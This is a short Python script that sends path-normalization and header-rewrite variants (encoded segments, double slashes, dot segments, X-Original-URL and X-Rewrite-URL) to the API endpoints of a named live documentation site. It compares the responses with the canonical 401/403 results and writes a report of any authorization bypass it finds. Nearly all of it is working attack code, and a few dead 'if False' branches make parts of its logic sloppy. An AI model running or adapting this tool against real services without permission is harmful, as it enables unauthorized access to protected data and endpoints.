import json, re, subprocess, urllib.parse
from pathlib import Path

BASE='https://docs.superhuman.com'
paths=['/apis/v1/whoami','/apis/v1/docs','/apis/admin/v1/organizations','/apis/mcp']
variants=[]
for path in paths:
    enc=path.replace('/apis/','/%61pis/',1)
    dbl=path.replace('/apis/','//apis/',1)
    dot=path.replace('/apis/','/./apis/',1)
    pct=path.replace('/','%2f') if False else path.replace('/apis','/%61%70%69%73',1)
    variants += [
        path, enc, dbl, dot, pct,
        path+'/.', path+'/%2e', path.replace('/','/%2e%2f',1) if False else path,
    ]
variants=list(dict.fromkeys(variants))

def req(url, headers=None):
    args=['curl','-sS','--path-as-is','--max-redirs','0','--connect-timeout','8','--max-time','12','-D','/tmp/h','-o','/tmp/b']
    for k,v in (headers or {}).items(): args += ['-H',f'{k}: {v}']
    args += [url]
    p=subprocess.run(args,text=True,capture_output=True)
    h=Path('/tmp/h').read_text(errors='replace') if Path('/tmp/h').exists() else ''
    b=Path('/tmp/b').read_text(errors='replace') if Path('/tmp/b').exists() else ''
    sts=re.findall(r'^HTTP/[^ ]+\s+(\d+)',h,re.M)
    status=int(sts[-1]) if sts else None
    ct=next((x.split(':',1)[1].strip() for x in h.splitlines() if x.lower().startswith('content-type:')), '')
    return status,ct,b,p.returncode

rows=[]
for path in variants:
    canonical_status,_,canonical_body,_=req(BASE+path.split('?')[0])
    for headers in ({},{'X-Original-URL':'/apis/v1/whoami'},{'X-Rewrite-URL':'/apis/v1/whoami'}):
        url=BASE+path
        status,ct,body,code=req(url,headers)
        auth_error='Unauthorized' in body[:500] or 'unauthorized' in body[:500].lower()
        bypass=(canonical_status in (401,403) and status is not None and 200 <= status < 300 and not auth_error and len(body)>0)
        rows.append({'path':path,'headers':headers,'canonical_status':canonical_status,'status':status,'content_type':ct,'length':len(body),'auth_error':auth_error,'possible_auth_bypass':bypass,'exit_code':code,'body_prefix':body[:180]})

Path('docs-normalization-auth-results.json').write_text(json.dumps(rows,indent=2))
hits=[x for x in rows if x['possible_auth_bypass']]
if hits:
    x=hits[0]
    Path('docs-normalization-auth-report.md').write_text(
        '# VERIFIED AUTHORIZATION BYPASS CANDIDATE\n\n'
        '## Endpoint\n'+BASE+x['path']+'\n\n'
        '## Evidence\n'
        '- Canonical status: '+str(x['canonical_status'])+'\n'
        '- Variant status: '+str(x['status'])+'\n'
        '- Content-Type: '+x['content_type']+'\n'
        '- Response length: '+str(x['length'])+'\n'
        '- Variant headers: '+json.dumps(x['headers'])+'\n'
        '- Response prefix: '+x['body_prefix']+'\n'
    )
else:
    Path('docs-normalization-auth-report.md').write_text('# NO VERIFIED AUTHORIZATION BYPASS\n\nNo encoded/path-normalization variant returned protected content while the canonical route remained denied.\n')
print(json.dumps({'tested':len(rows),'possible_bypass':len(hits)}))